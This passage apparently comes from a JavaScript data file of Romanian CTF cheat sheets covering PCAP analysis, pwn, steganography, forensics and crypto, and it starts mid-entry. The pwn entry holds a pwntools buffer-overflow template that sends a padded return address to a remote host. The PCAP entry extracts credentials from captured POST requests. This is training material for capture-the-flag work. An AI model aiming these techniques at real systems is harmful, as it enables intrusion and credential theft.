            description: "Analiza traficului de rețea. Extragere credențiale, urmarire fluxuri TCP și analiză Wireshark/tshark.",
            content: `tshark -r file.pcap
tshark -r file.pcap -Y "http"
tshark -r file.pcap -Y "dns"
tshark -r file.pcap -Y "ftp"

Extract creds:
tshark -r file.pcap -Y "http.request.method == POST"

Follow stream:
Wireshark → Follow TCP Stream

Export files:
File → Export Objects → HTTP

Search flag:
strings file.pcap | grep -i flag

DNS exfil:
tshark -r file.pcap -Y "dns" | grep TXT`,
        },
        {
            id: 3,
            title: "Flux de lucru PWN",
            category: "Pwn",
            description: "Ghid pas cu pas pentru abordarea provocărilor de tip Pwn/Binary Exploitation.",
            content: `file chall
checksec chall
gdb ./chall
run
disas main
pattern create 200
pattern offset VALUE

Exploit:
from pwn import *
p = remote("IP", PORT)
payload = b"A"*offset + p64(addr)
p.sendline(payload)
p.interactive()

ROP:
ROPgadget --binary chall
one_gadget libc.so.6`,
        },
        {
            id: 4,
            title: "Comenzi rapide STEGO",
            category: "Stego",
            description: "Extragere de date ascunse în fișiere, imagini și grafice audio (Steganography).",
            content: `file img.jpg
strings img.jpg
exiftool img.jpg
binwalk -e img.jpg
steghide extract -sf img.jpg
zsteg img.png
xxd file | tail

Audio:
audacity → spectrogram`,
        },
        {
            id: 5,
            title: "Analiză FORENSICS",
            category: "Forensics",
            description: "Metodologii pentru analiza sistemelor de operare compromise și dump-uri de memorie folosind Volatility.",
            content: `file dump
strings dump
binwalk dump
mount -o loop disk.img /mnt

Volatility:
volatility -f dump.raw imageinfo
volatility -f dump.raw --profile=Win7SP1x64 pslist
volatility -f dump.raw filescan
volatility -f dump.raw dumpfiles`,
        },
        {
            id: 6,
            title: "Ghid CRYPTO",
            category: "Crypto",
            description: "Metode și decodificări rapide pentru probleme de Cryptography, XOR, RSA și formatări clasice.",
            content: `base64 -d file
xxd -r -p file
CyberChef → Magic

XOR brute:
for k in range(256):
print(bytes([b ^ k for b in data]))

openssl enc -d -aes-256-cbc -in file

RSA:
factordb.com
Wiener attack
Hastad attack`,
        },
        {
            id: 71,
            title: "Base64 Decoding Script",
            category: "Crypto",
            description: "Script Python pentru decodarea rapidă a fișierelor Base64 în binar (util pentru CTF).",
            content: `Base64 to File Decoder:
import base64

# Citire date Base64 din fisier
with open('hash.txt', 'r') as f:
    b64_data = f.read().strip()

# Decodare in binar
decoded = base64.b64decode(b64_data)

# Salvare ca fisier binar (ex: imagine, exe, shellcode)
with open('output.bin', 'wb') as f:
    f.write(decoded)

[+] Sfat: Foloseste 'file output.bin' dupa decodare pentru a identifica formatul real al fisierului.`
        }
    ],
    categories: ["Toate", "Web", "PCAP", "Pwn", "Stego", "Forensics", "Crypto"]
};
established
